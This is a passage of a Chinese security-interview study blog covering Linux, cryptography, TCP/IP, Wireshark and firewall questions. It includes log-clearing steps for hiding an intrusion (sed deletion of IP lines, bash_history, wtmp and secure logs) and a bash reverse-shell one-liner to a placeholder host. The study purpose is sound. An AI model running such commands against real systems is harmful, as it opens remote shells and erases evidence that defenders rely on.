+<p>e.g. sed -i -e ‘&#x2F;192.169.1.1&#x2F;d’</p>
+<p>history命令的清除，也是对~&#x2F;.bash_history进行定向清除</p>
+<p>wtmp日志的清除，&#x2F;var&#x2F;log&#x2F;wtmp</p>
+<p>登录日志清除 &#x2F;var&#x2F;log&#x2F;secure</p>
+<h3 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h3><h4 id="查看当前端口连接的命令有哪些？netstat-和-ss-命令的区别和优缺点"><a href="#查看当前端口连接的命令有哪些？netstat-和-ss-命令的区别和优缺点" class="headerlink" title="查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点"></a>查看当前端口连接的命令有哪些？<code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netstat -antp` `ss -l<br></code></pre></td></tr></table></figure>
+
+<p>ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。</p>
+<h4 id="反弹-shell-的常用命令？一般常反弹哪一种-shell？为什么"><a href="#反弹-shell-的常用命令？一般常反弹哪一种-shell？为什么" class="headerlink" title="反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?"></a>反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<h4 id="通过Linux系统的-x2F-proc目录-，能够获取到哪些信息，这些信息可以在安全上有哪些应用？"><a href="#通过Linux系统的-x2F-proc目录-，能够获取到哪些信息，这些信息可以在安全上有哪些应用？" class="headerlink" title="通过Linux系统的&#x2F;proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？"></a>通过Linux系统的&#x2F;proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ls /proc<br></code></pre></td></tr></table></figure>
+
+<p>系统信息，硬件信息，内核版本，加载的模块，进程</p>
+<h4 id="linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。"><a href="#linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。" class="headerlink" title="linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。"></a>linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</h4><p><code>/etc/ssh/sshd___config</code> iptables配置</p>
+<h4 id="如何一条命令查看文件内容最后一百行"><a href="#如何一条命令查看文件内容最后一百行" class="headerlink" title="如何一条命令查看文件内容最后一百行"></a>如何一条命令查看文件内容最后一百行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tail -n 100 filename<br></code></pre></td></tr></table></figure>
+
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。"><a href="#如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。" class="headerlink" title="如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。"></a>如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</h4><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="AES／DES的具体工作步骤"><a href="#AES／DES的具体工作步骤" class="headerlink" title="AES／DES的具体工作步骤"></a>AES／DES的具体工作步骤</h3><h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h3><p>加密: $$ 密文＝明文^EmodN $$ RSA加密是对明文的E次方后除以N后求余数的过程</p>
+<p>$$ 公钥＝(E,N) $$ 解密:</p>
+<p>$$ 明文＝密文^DmodN $$ $$ 私钥＝(D,N) $$ 三个参数n,e1,e2</p>
+<p>n是两个大质数p,q的积</p>
+<h3 id="分组密码的加密模式"><a href="#分组密码的加密模式" class="headerlink" title="分组密码的加密模式"></a>分组密码的加密模式</h3><h3 id="如何生成一个安全的随机数？"><a href="#如何生成一个安全的随机数？" class="headerlink" title="如何生成一个安全的随机数？"></a>如何生成一个安全的随机数？</h3><p>引用之前一个学长的答案，可以通过一些物理系统生成随机数，如电压的波动、磁盘磁头读&#x2F;写时的寻道时间、空中电磁波的噪声等。</p>
+<h3 id="SSL握手过程"><a href="#SSL握手过程" class="headerlink" title="SSL握手过程"></a>SSL握手过程</h3><p>建立TCP连接、客户端发送SSL请求、服务端处理SSL请求、客户端发送公共密钥加密过的随机数据、服务端用私有密钥解密加密后的随机数据并协商暗号、服务端跟客户端利用暗号生成加密算法跟密钥key、之后正常通信。 这部分本来是忘了的，但是之前看SSL Pinning的时候好像记了张图在脑子里，挣扎半天还是没敢确定，遂放弃。。。</p>
+<h3 id="对称加密与非对称加密的不同，分别用在哪些方面"><a href="#对称加密与非对称加密的不同，分别用在哪些方面" class="headerlink" title="对称加密与非对称加密的不同，分别用在哪些方面"></a>对称加密与非对称加密的不同，分别用在哪些方面</h3><h2 id="TCP-x2F-IP"><a href="#TCP-x2F-IP" class="headerlink" title="TCP&#x2F;IP"></a>TCP&#x2F;IP</h2><h3 id="TCP三次握手的过程以及对应的状态转换"><a href="#TCP三次握手的过程以及对应的状态转换" class="headerlink" title="TCP三次握手的过程以及对应的状态转换"></a>TCP三次握手的过程以及对应的状态转换</h3><p>（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;<br>（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;<br>（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。</p>
+<h3 id="TCP和UDP协议区别"><a href="#TCP和UDP协议区别" class="headerlink" title="TCP和UDP协议区别"></a>TCP和UDP协议区别</h3><p>tcp面向连接,udp面向报文 tcp对系统资源的要求多 udp结构简单 tcp保证数据完整性和顺序，udp不保证</p>
+<h3 id="https的建立过程"><a href="#https的建立过程" class="headerlink" title="https的建立过程"></a>https的建立过程</h3><ul>
+<li>客户端发送请求到服务器端</li>
+<li>服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在</li>
+<li>客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端</li>
+<li>服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端</li>
+<li>客户端使用共享密钥解密数据</li>
+<li>SSL加密建立</li>
+</ul>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="wireshark简单的过滤规则"><a href="#wireshark简单的过滤规则" class="headerlink" title="wireshark简单的过滤规则"></a>wireshark简单的过滤规则</h3><p><strong>过滤ip</strong>:</p>
+<p>过滤源ip地址:<code>ip.src==1.1.1.1;</code>,目的ip地址:<code>ip.dst==1.1.1.1;</code></p>
+<p><strong>过滤端口</strong>:</p>
+<p>过滤80端口:<code>tcp.port==80</code>,源端口:<code>tcp.srcport==80</code>,目的端口:<code>tcp.dstport==80</code></p>
+<p><strong>协议过滤</strong>:</p>
+<p>直接输入协议名即可,如http协议<code>http</code></p>
+<p><strong>http模式过滤</strong>:</p>
+<p>过滤get&#x2F;post包<code>http.request.mothod==&quot;GET/POST&quot;</code></p>
+<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><h3 id="简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。"><a href="#简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。" class="headerlink" title="简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。"></a>简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</h3><blockquote>
+<p>转载请注明出处谢谢！</p>
+</blockquote>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2021/04/22/life/%E8%A7%89%E9%86%92%E4%B9%8B%E8%B7%AF/">← Next 觉醒之路</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2021/04/05/security/ctf/compitation/wp-hf-2021/">虎符网络安全大赛之零解 Prev →</a></div></div></div><details id="reward"><summary>打赏点小钱</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="/images/header.jpg" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%B5%81%E7%A8%8B"><span class="toc-text">思路流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-amp-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">漏洞利用&amp;权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE-amp-%E8%BE%93%E5%87%BA%E6%8A%A5%E5%91%8A"><span class="toc-text">清除测试数据&amp;输出报告</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E6%B5%8B"><span class="toc-text">复测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%80%E9%9D%A2"><span class="toc-text">深信服一面:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4"><span class="toc-text">SQL注入防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%8F%AF%E4%BB%A5%E9%98%B2%E6%AD%A2sql%E6%B3%A8%E5%85%A5"><span class="toc-text">为什么参数化查询可以防止sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E5%A4%B4%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">SQL头注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E6%80%8E%E4%B9%88%E7%9B%B2%E6%B3%A8%EF%BC%9F"><span class="toc-text">盲注是什么？怎么盲注？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="toc-text">宽字节注入产生原理以及根本原因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86"><span class="toc-text">产生原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%93%AA%E9%87%8C%E7%BC%96%E7%A0%81"><span class="toc-text">在哪里编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="toc-text">根本原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95"><span class="toc-text">解决办法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E9%87%8C%E9%9D%A2%E5%8F%AA%E6%9C%89update%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8"><span class="toc-text">sql里面只有update怎么利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E5%A6%82%E4%BD%95%E5%86%99shell-x2F-%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-text">sql如何写shell&#x2F;单引号被过滤怎么办</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">代替空格的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%9A%84%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A5%EF%BC%8C5-0%E4%BB%A5%E4%B8%8A%E5%92%8C5-0%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-text">mysql的网站注入，5.0以上和5.0以下有什么区别？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%8E%9F%E7%90%86"><span class="toc-text">XSS原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8B"><span class="toc-text">储存型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-text">DOM型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8B%E5%92%8C%E5%8F%8D%E5%B0%84%E5%9E%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">DOM型和反射型的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8BXSS-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%88%96%E4%BA%BA%E5%B7%A5%E6%B5%8B%E8%AF%95"><span class="toc-text">DOM型XSS 自动化测试或人工测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%8F%91%E7%8E%B0xss%E4%BD%8D%E7%BD%AE"><span class="toc-text">如何快速发现xss位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8EXSS%E6%80%8E%E4%B9%88%E4%BF%AE%E8%A1%A5%E5%BB%BA%E8%AE%AE"><span class="toc-text">对于XSS怎么修补建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E8%A0%95%E8%99%AB%E7%9A%84%E4%BA%A7%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="toc-text">XSS蠕虫的产生条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%8E%9F%E7%90%86"><span class="toc-text">CSRF原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#token%E5%92%8Creferer%E5%81%9A%E6%A8%AA%E5%90%91%E5%AF%B9%E6%AF%94%EF%BC%8C%E8%B0%81%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E9%AB%98%EF%BC%9F"><span class="toc-text">token和referer做横向对比，谁安全等级高？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9referer%E7%9A%84%E9%AA%8C%E8%AF%81%EF%BC%8C%E4%BB%8E%E4%BB%80%E4%B9%88%E8%A7%92%E5%BA%A6%E5%8E%BB%E5%81%9A%EF%BC%9F%E5%A6%82%E6%9E%9C%E5%81%9A%EF%BC%8C%E6%80%8E%E4%B9%88%E6%9D%9C%E7%BB%9D%E9%97%AE%E9%A2%98"><span class="toc-text">对referer的验证，从什么角度去做？如果做，怎么杜绝问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9token%EF%BC%8C%E5%AF%B9token%E6%B5%8B%E8%AF%95%E4%BC%9A%E6%B3%A8%E6%84%8F%E5%93%AA%E6%96%B9%E9%9D%A2%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BC%9A%E5%AF%B9token%E7%9A%84%E5%93%AA%E6%96%B9%E9%9D%A2%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95%EF%BC%9F"><span class="toc-text">针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-text">检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0-%E9%98%B2%E5%BE%A1-%E7%BB%95%E8%BF%87"><span class="toc-text">SSRF漏洞的成因 防御 绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0"><span class="toc-text">上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">文件上传漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">常见的上传绕过方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-text">防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E6%9F%A5%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E5%85%83%E7%B4%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="toc-text">审查上传点的元素有什么意义？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">导致文件包含的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">本地文件包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%91%E8%9E%8D%E8%A1%8C%E4%B8%9A%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">金融行业常见逻辑漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA"><span class="toc-text">溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP%E6%AC%BA%E9%AA%97"><span class="toc-text">ARP欺骗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-1"><span class="toc-text">防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DDOS"><span class="toc-text">DDOS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ddos%E5%8E%9F%E7%90%86"><span class="toc-text">Ddos原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#syn%E6%B4%AA%E6%B5%81%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">syn洪流的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">CC攻击原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDOS%E9%98%B2%E6%8A%A4"><span class="toc-text">DDOS防护</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E4%B8%A4%E7%A7%8D%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-text">mysql两种提权方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql-UDF%E6%8F%90%E6%9D%83"><span class="toc-text">Mysql_UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql-mof%E6%8F%90%E6%9D%83"><span class="toc-text">Mysql mof提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%BC%8F%E6%B4%9E"><span class="toc-text">特殊漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-045"><span class="toc-text">Struts2-045</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-text">利用条件和方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Jenkins未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">MongoDB未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-2"><span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Memcache未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8A%A0%E5%9B%BA"><span class="toc-text">漏洞加固</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FFMPEG-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">FFMPEG 本地文件读取漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-text">原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86"><span class="toc-text">安全知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8WEB%E5%BC%80%E5%8F%91JAVA%E6%A1%86%E6%9E%B6"><span class="toc-text">常用WEB开发JAVA框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jsonp%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%EF%BC%8C%E6%80%8E%E4%B9%88%E5%86%99Jsonp%E7%9A%84%E6%94%BB%E5%87%BB%E9%A1%B5%E9%9D%A2%EF%BC%9F"><span class="toc-text">Jsonp安全攻防技术，怎么写Jsonp的攻击页面？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E5%88%B0Jsonp%E7%9A%84%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%86%85%E5%AE%B9"><span class="toc-text">涉及到Jsonp的安全攻防内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%A1%B5%E9%9D%A2"><span class="toc-text">攻击页面</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B8%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">php中命令执行涉及到的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%BB%95%E8%BF%87php%E7%9A%84disable-fuction"><span class="toc-text">安全模式下绕过php的disable fuction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="toc-text">PHP弱类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E5%AD%98%E6%94%BE%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-text">各种数据库文件存放的位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F"><span class="toc-text">系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97"><span class="toc-text">如何清理日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5-Linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%9C%80%E8%A6%81%E6%B8%85%E9%99%A4%E5%93%AA%E4%BA%9B%E6%97%A5%E5%BF%97%EF%BC%9F"><span class="toc-text">入侵 Linux 服务器后需要清除哪些日志？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LINUX"><span class="toc-text">LINUX</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 